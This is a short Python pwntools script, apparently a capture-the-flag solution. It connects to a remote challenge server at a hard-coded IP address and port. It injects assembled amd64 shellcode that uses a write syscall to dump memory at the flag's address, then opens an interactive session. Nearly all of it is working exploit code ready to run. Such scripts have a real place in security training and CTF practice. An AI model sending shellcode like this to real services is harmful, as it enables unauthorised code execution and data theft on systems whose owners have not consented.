#!/usr/bin/python3
from pwn import *


gs = '''
continue
'''
def start():
    return remote("54.85.45.101", 8005)

context.update(arch='amd64', os='linux')

# Plan:
# Send shellcode

# Addresses
# Flag: 0x4040a0

# Functions

shellcode = asm('\n'.join([
    'mov rax, 0x1',
    'mov rdi, 0x1',
    'mov rsi, 0x4040a0',
    'mov rdx, 64',
    'syscall',
]))


io = start()

io.sendlineafter(b"Flag is at 0x4040a0",shellcode)


io.interactive()
